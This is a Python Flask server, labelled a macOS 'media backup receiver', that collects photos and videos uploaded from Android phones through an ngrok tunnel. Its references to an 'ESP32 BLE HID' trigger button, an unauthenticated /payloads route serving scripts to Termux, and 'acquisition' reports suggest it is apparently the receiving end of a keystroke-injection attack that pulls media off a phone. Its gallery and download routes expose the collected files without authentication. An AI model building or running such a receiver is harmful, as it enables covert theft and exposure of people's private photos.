#!/usr/bin/env python3
"""
server.py — macOS media backup receiver
========================================
Receives media files uploaded by media_backup.py running in Termux on Android.
Exposed to the internet via ngrok HTTPS tunnel.

HOW TO START (two Terminal tabs):
  Tab 1:  ngrok http 8019
  Tab 2:  cd fetch_photos/server && python3 server.py

Configuration (environment variables):
  UPLOAD_TOKEN   Required auth token that the Android client must send in the
                 X-Backup-Token header.  Set this once:
                     export UPLOAD_TOKEN="your_long_random_secret"
                 Or put it in a .env file:
                     echo 'UPLOAD_TOKEN=your_long_random_secret' > .env

  BACKUP_DIR     Root directory where received files are stored.
                 Defaults to  ./Android_Media_Backup  next to this script.

API endpoints:
  GET  /health              Liveness probe — returns {"status":"ok"}
  POST /upload              Receive a media file from the Android client
  GET  /files               HTML gallery + file listing
  GET  /download/<file_id>  Download a specific file by its stored name
  GET  /report              JSON acquisition report
  GET  /payloads/<filename> Serve Android client scripts to Termux (no auth)
"""

import os
import re
import io
import csv
import json
import uuid
import hmac
import hashlib
import logging
import zipfile
import urllib.request
from pathlib import Path
from datetime import datetime
from functools import wraps

from flask import (
    Flask, request, jsonify,
    send_from_directory, send_file,
    render_template_string, abort
)

# ── Configuration ─────────────────────────────────────────────────────────────

_BASE_DIR    = Path(__file__).resolve().parent
_DOTENV      = _BASE_DIR / ".env"

# Load .env file if present (simple KEY=VALUE parser, no dependency needed)
if _DOTENV.exists():
    with open(_DOTENV) as _f:
        for _line in _f:
            _line = _line.strip()
            if _line and not _line.startswith("#") and "=" in _line:
                _k, _, _v = _line.partition("=")
                os.environ.setdefault(_k.strip(), _v.strip())

UPLOAD_TOKEN  = os.environ.get("UPLOAD_TOKEN", "")
BACKUP_DIR    = Path(os.environ.get("BACKUP_DIR", str(_BASE_DIR / "Android_Media_Backup")))
PAYLOAD_DIR   = _BASE_DIR / "payloads"
LOG_FILE      = BACKUP_DIR / "Reports" / "transfer.log"
MANIFEST_FILE = BACKUP_DIR / "Reports" / "sha256_manifest.txt"
REPORT_CSV    = BACKUP_DIR / "Reports" / "acquisition_report.csv"
REPORT_JSON   = BACKUP_DIR / "Reports" / "acquisition_report.json"
PORT          = 8019
MAX_FILE_MB   = 500

# Allowed media extensions
MEDIA_EXTS = {
    ".jpg", ".jpeg", ".png", ".webp", ".heic", ".gif",
    ".bmp", ".tiff", ".tif", ".dng", ".raw",
    ".mp4", ".mov", ".avi", ".mkv", ".3gp", ".m4v", ".webm", ".ts",
}

# Category → subdirectory mapping
CATEGORY_DIRS = {
    "DCIM":        "DCIM",
    "Pictures":    "Pictures",
    "Screenshots": "Screenshots",
    "Movies":      "Movies",
    "Downloads":   "Downloads",
    "Other":       "Other",
}

# ── Directory setup ───────────────────────────────────────────────────────────

for _subdir in list(CATEGORY_DIRS.values()) + ["Reports"]:
    (BACKUP_DIR / _subdir).mkdir(parents=True, exist_ok=True)
PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)

# ── Logging ───────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s  %(levelname)-7s  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(str(LOG_FILE), encoding="utf-8"),
    ],
)
log = logging.getLogger("server")

# ── Flask app ─────────────────────────────────────────────────────────────────

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = (MAX_FILE_MB + 10) * 1024 * 1024

# ── In-memory duplicate index: sha256 → stored filename ──────────────────────
# Populated at startup from the manifest file, updated on every upload.

_sha_index: dict[str, str] = {}

def _load_manifest():
    """Load SHA-256 → filename index from the manifest file."""
    if not MANIFEST_FILE.exists():
        return
    with open(MANIFEST_FILE, encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split(None, 1)
            if len(parts) == 2:
                _sha_index[parts[0]] = parts[1]

def _append_manifest(sha256, filename):
    """Append one entry to the manifest file and update the in-memory index."""
    _sha_index[sha256] = filename
    with open(MANIFEST_FILE, "a", encoding="utf-8") as fh:
        fh.write(f"{sha256}  {filename}\n")

_load_manifest()
log.info("Manifest loaded — %d known files.", len(_sha_index))

# ── CSV report helper ─────────────────────────────────────────────────────────

def _append_csv(row: dict):
    new_file = not REPORT_CSV.exists()
    with open(REPORT_CSV, "a", newline="", encoding="utf-8") as fh:
        w = csv.DictWriter(fh, fieldnames=[
            "timestamp", "original_name", "saved_name",
            "category", "size_bytes", "sha256", "client_mtime",
        ])
        if new_file:
            w.writeheader()
        w.writerow(row)

# ── Helpers ───────────────────────────────────────────────────────────────────

def _safe_filename(name: str) -> str:
    """
    Sanitise an arbitrary filename so it cannot escape BACKUP_DIR.
    Keeps alphanumerics, dots, hyphens, underscores.  Collapses everything
    else to underscores.  Strips leading dots to prevent hidden files.
    """
    name  = os.path.basename(name)   # strip any directory component
    name  = re.sub(r"[^\w.\-]", "_", name)
    name  = name.lstrip(".")
    return name or "file"

def _resolve_category(raw: str) -> str:
    return CATEGORY_DIRS.get(raw.strip(), "Other")

def _sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()

# ── Auth decorator ────────────────────────────────────────────────────────────

def require_token(fn):
    """
    Reject requests that do not carry the correct X-Backup-Token header.
    Skipped entirely if UPLOAD_TOKEN is empty (development convenience).
    Uses constant-time comparison to prevent timing attacks.
    """
    @wraps(fn)
    def wrapper(*args, **kwargs):
        if UPLOAD_TOKEN:
            provided = request.headers.get("X-Backup-Token", "")
            if not hmac.compare_digest(provided, UPLOAD_TOKEN):
                log.warning("Auth failure from %s", request.remote_addr)
                return jsonify({"ok": False, "error": "Unauthorized"}), 401
        return fn(*args, **kwargs)
    return wrapper

# ── Endpoints ─────────────────────────────────────────────────────────────────

# GET /health ─────────────────────────────────────────────────────────────────
@app.route("/health", methods=["GET"])
def health():
    """Liveness probe — no auth required."""
    total  = sum(1 for _ in BACKUP_DIR.rglob("*") if _.is_file() and _.parent.name != "Reports")
    return jsonify({"status": "ok", "files": total, "max_file_mb": MAX_FILE_MB}), 200


# POST /upload ────────────────────────────────────────────────────────────────
@app.route("/upload", methods=["POST"])
@require_token
def upload():
    """
    Receive a media file from the Android client.

    Expected multipart/form-data fields:
        file      : binary file data (required)
        sha256    : hex SHA-256 of the original file (required)
        category  : DCIM | Pictures | Screenshots | Movies | Downloads | Other
        mtime     : ISO-8601 original modification time (optional)
    """
    # ── Validate required fields ──────────────────────────────────────────
    if "file" not in request.files:
        return jsonify({"ok": False, "error": "Missing 'file' field"}), 400

    f = request.files["file"]
    if not f.filename:
        return jsonify({"ok": False, "error": "Empty filename"}), 400

    client_sha = request.form.get("sha256", "").strip().lower()
    if not re.fullmatch(r"[0-9a-f]{64}", client_sha):
        return jsonify({"ok": False, "error": "Missing or invalid sha256 field"}), 400

    # ── File type validation ──────────────────────────────────────────────
    ext = Path(f.filename).suffix.lower()
    if ext not in MEDIA_EXTS:
        return jsonify({"ok": False, "error": f"Unsupported extension: {ext}"}), 415

    # Duplicate detection is disabled — every upload is accepted.
    # To re-enable, uncomment these four lines:
    # if client_sha in _sha_index:
    #     existing = _sha_index[client_sha]
    #     log.debug("Duplicate skipped: %s", f.filename)
    #     return jsonify({"ok": True, "duplicate": True, "saved": existing}), 409

    # ── Build safe destination path ───────────────────────────────────────
    raw_category = request.form.get("category", "Other")
    subdir       = _resolve_category(raw_category)
    safe_name    = _safe_filename(f.filename)
    timestamp    = datetime.now().strftime("%Y%m%d_%H%M%S")
    unique_id    = uuid.uuid4().hex[:8]
    stored_name  = f"{timestamp}_{unique_id}_{safe_name}"
    dest_path    = BACKUP_DIR / subdir / stored_name

    # ── Save file ─────────────────────────────────────────────────────────
    f.save(str(dest_path))
    size_bytes = dest_path.stat().st_size

    # ── File size post-save validation ────────────────────────────────────
    if size_bytes > MAX_FILE_MB * 1024 * 1024:
        dest_path.unlink(missing_ok=True)
        return jsonify({"ok": False, "error": f"File exceeds {MAX_FILE_MB} MB limit"}), 413

    # ── Server-side SHA-256 verification ──────────────────────────────────
    server_sha = _sha256_file(dest_path)
    if server_sha != client_sha:
        dest_path.unlink(missing_ok=True)
        log.error("SHA-256 mismatch for %s: client=%s server=%s",
                  f.filename, client_sha, server_sha)
        return jsonify({
            "ok": False,
            "error": "SHA-256 mismatch — file may be corrupted in transit",
            "client_sha": client_sha,
            "server_sha": server_sha,
        }), 422

    # ── Update manifest and CSV report ────────────────────────────────────
    _append_manifest(server_sha, stored_name)
    _append_csv({
        "timestamp":     timestamp,
        "original_name": safe_name,
        "saved_name":    stored_name,
        "category":      subdir,
        "size_bytes":    size_bytes,
        "sha256":        server_sha,
        "client_mtime":  request.form.get("mtime", ""),
    })

    log.info("OK  %s  →  %s/%s  (%d KB)",
             f.filename, subdir, stored_name, size_bytes // 1024)

    return jsonify({
        "ok":       True,
        "saved":    stored_name,
        "category": subdir,
        "size_kb":  size_bytes // 1024,
        "sha256":   server_sha,
        "file_id":  stored_name,
    }), 200


# GET /files ──────────────────────────────────────────────────────────────────
@app.route("/files", methods=["GET"])
def files_gallery():
    """HTML gallery of all received files, grouped by category."""
    groups = {}
    for subdir in CATEGORY_DIRS.values():
        d = BACKUP_DIR / subdir
        if not d.exists():
            continue
        entries = sorted(d.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True)
        items   = [p.name for p in entries if p.is_file()]
        if items:
            groups[subdir] = items

    total = sum(len(v) for v in groups.values())
    total_mb = sum(
        (BACKUP_DIR / cat / fname).stat().st_size
        for cat, fnames in groups.items()
        for fname in fnames
    ) / 1_048_576

    return render_template_string(GALLERY_HTML, groups=groups,
                                  total=total, total_mb=round(total_mb, 1))


# GET /download/<file_id> ─────────────────────────────────────────────────────
@app.route("/download/<path:file_id>", methods=["GET"])
def download_file(file_id):
    """
    Serve a file for download.
    file_id  is  <category>/<stored_name>  or just  <stored_name>.
    Directory traversal is prevented by resolving the final path and
    confirming it is inside BACKUP_DIR.
    """
    # Sanitise — reject anything that looks like a path traversal attempt
    if ".." in file_id or file_id.startswith("/"):
        abort(400)

    # Try category/name form first, then search all category dirs
    candidate = BACKUP_DIR / file_id
    if not candidate.exists() or not candidate.is_file():
        # Search in category subdirs
        name = Path(file_id).name
        found = None
        for subdir in CATEGORY_DIRS.values():
            p = BACKUP_DIR / subdir / name
            if p.exists() and p.is_file():
                found = p
                break
        if not found:
            abort(404)
        candidate = found

    # Confirm the resolved path is inside BACKUP_DIR (defence in depth)
    try:
        candidate.resolve().relative_to(BACKUP_DIR.resolve())
    except ValueError:
        abort(403)

    return send_from_directory(str(candidate.parent), candidate.name, as_attachment=True)


# GET /report ─────────────────────────────────────────────────────────────────
@app.route("/report", methods=["GET"])
def report():
    """JSON acquisition report — counts, sizes, last activity per category."""
    result = {"generated": datetime.now().isoformat(), "categories": {}, "totals": {}}
    grand_count = 0
    grand_bytes = 0

    for subdir in CATEGORY_DIRS.values():
        d = BACKUP_DIR / subdir
        if not d.exists():
            result["categories"][subdir] = {"count": 0, "size_mb": 0}
            continue
        files = [p for p in d.iterdir() if p.is_file()]
        size  = sum(p.stat().st_size for p in files)
        last  = max((p.stat().st_mtime for p in files), default=0)
        result["categories"][subdir] = {
            "count":   len(files),
            "size_mb": round(size / 1_048_576, 2),
            "last_upload": datetime.fromtimestamp(last).isoformat() if last else None,
        }
        grand_count += len(files)
        grand_bytes += size

    result["totals"] = {
        "files":    grand_count,
        "size_mb":  round(grand_bytes / 1_048_576, 2),
        "known_hashes": len(_sha_index),
    }

    # Persist JSON report
    with open(REPORT_JSON, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)

    return jsonify(result), 200


# GET /payloads/<filename> ────────────────────────────────────────────────────
@app.route("/payloads/<filename>", methods=["GET"])
def serve_payload(filename):
    """Serve Python client scripts to Termux — no auth required."""
    safe = _safe_filename(filename)
    if safe != filename:
        abort(400)
    log.info("Payload request: %s", filename)
    return send_from_directory(str(PAYLOAD_DIR), filename, as_attachment=False)


# ── Gallery HTML template ─────────────────────────────────────────────────────

GALLERY_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Android Media Backup</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:-apple-system,"Segoe UI",system-ui,sans-serif;
       background:#f7f8fa;color:#1f2328;padding:24px 32px}
  h1{font-size:1.3rem;margin-bottom:4px}
  .sub{font-size:.85rem;color:#57606a;margin-bottom:20px}
  .bar{display:flex;gap:12px;margin-bottom:28px;flex-wrap:wrap;align-items:center}
  .badge{background:#e5e7eb;border-radius:20px;padding:4px 12px;font-size:.8rem;color:#57606a}
  .btn{display:inline-block;padding:8px 16px;border-radius:6px;font-size:.85rem;
       font-weight:600;text-decoration:none;color:#fff;background:#3b82d4}
  h2{font-size:1rem;margin:24px 0 10px;border-bottom:1px solid #e5e7eb;padding-bottom:6px}
  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:10px}
  .card{background:#fff;border:1px solid #e5e7eb;border-radius:8px;overflow:hidden}
  .card img{width:100%;height:140px;object-fit:cover;display:block;background:#f0f0f0}
  .card video{width:100%;height:140px;object-fit:cover;display:block;background:#111}
  .card .meta{padding:6px 10px;font-size:.72rem;color:#57606a;
              white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
  .card a.dl{display:block;font-size:.75rem;padding:0 10px 8px;
             color:#3b82d4;text-decoration:none}
  .empty{color:#57606a;font-size:.9rem;margin-top:40px;text-align:center}
  .refresh{font-size:.75rem;color:#57606a;margin-left:auto}
</style>
</head>
<body>
  <h1>Android Media Backup</h1>
  <p class="sub">ESP32 BLE HID · Termux · ngrok · macOS receiver</p>
  <div class="bar">
    <span class="badge">{{ total }} files</span>
    <span class="badge">{{ total_mb }} MB</span>
    <a class="btn" href="/report">Report (JSON)</a>
    <span class="refresh">Auto-refreshes every 15 s</span>
  </div>

  {% if groups %}
    {% for cat, files in groups.items() %}
    <h2>{{ cat }} &mdash; {{ files|length }} files</h2>
    <div class="grid">
      {% for fname in files %}
      {% set ext = fname.rsplit('.',1)[-1].lower() %}
      <div class="card">
        {% if ext in ['jpg','jpeg','png','webp','gif','bmp','tiff','tif'] %}
        <a href="/download/{{ cat }}/{{ fname }}" target="_blank">
          <img src="/download/{{ cat }}/{{ fname }}" alt="{{ fname }}" loading="lazy">
        </a>
        {% elif ext in ['mp4','mov','avi','mkv','3gp','m4v','webm'] %}
        <video controls preload="metadata">
          <source src="/download/{{ cat }}/{{ fname }}">
        </video>
        {% else %}
        <div style="height:140px;display:flex;align-items:center;
                    justify-content:center;font-size:2rem;background:#f0f0f0">📄</div>
        {% endif %}
        <div class="meta" title="{{ fname }}">{{ fname }}</div>
        <a class="dl" href="/download/{{ cat }}/{{ fname }}" download>⬇ Download</a>
      </div>
      {% endfor %}
    </div>
    {% endfor %}
  {% else %}
  <p class="empty">No media received yet. Press GPIO 19 on the ESP32.</p>
  {% endif %}
<script>setTimeout(()=>location.reload(),15000)</script>
</body>
</html>
"""

# ── ngrok URL detection ───────────────────────────────────────────────────────

def get_ngrok_url() -> str:
    try:
        with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=2) as r:
            data = json.loads(r.read())
        for t in data.get("tunnels", []):
            pub = t.get("public_url", "")
            if pub.startswith("https://"):
                return pub
    except Exception:
        pass
    return ""

# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    public_url = get_ngrok_url()

    if not UPLOAD_TOKEN:
        log.warning("UPLOAD_TOKEN is not set — uploads will not be authenticated.")
        log.warning("Set it:  export UPLOAD_TOKEN='your_secret'  then restart.")

    if public_url:
        url_file = _BASE_DIR / "ngrok_url.txt"
        url_file.write_text(public_url + "\n")
        # Print URL to terminal but never print the token
        print(f"\n  ╔══════════════════════════════════════════════════════════╗")
        print(f"  ║        Android Media Backup Server  —  ngrok active      ║")
        print(f"  ╠══════════════════════════════════════════════════════════╣")
        print(f"  ║  Public URL  :  {public_url}")
        print(f"  ║  Health      :  {public_url}/health")
        print(f"  ║  Upload      :  {public_url}/upload        (POST)")
        print(f"  ║  Gallery     :  {public_url}/files")
        print(f"  ║  Report      :  {public_url}/report")
        print(f"  ║  Auth token  :  {'SET' if UPLOAD_TOKEN else 'NOT SET  ← WARNING'}")
        print(f"  ╠══════════════════════════════════════════════════════════╣")
        print(f"  ║  Paste the Public URL into WAN_SERVER_URL in .ino        ║")
        print(f"  ║  URL saved → {url_file}")
        print(f"  ╚══════════════════════════════════════════════════════════╝\n")
    else:
        print("\n  ╔══════════════════════════════════════════════════════════╗")
        print("  ║  [!] ngrok NOT detected on 127.0.0.1:4040                ║")
        print("  ║      Start ngrok FIRST:  ngrok http 8019                 ║")
        print("  ║      Then restart this server.                           ║")
        print("  ╚══════════════════════════════════════════════════════════╝\n")
        print(f"  Starting on port {PORT} (LAN-only without ngrok).\n")

    app.run(host="0.0.0.0", port=PORT, debug=False)
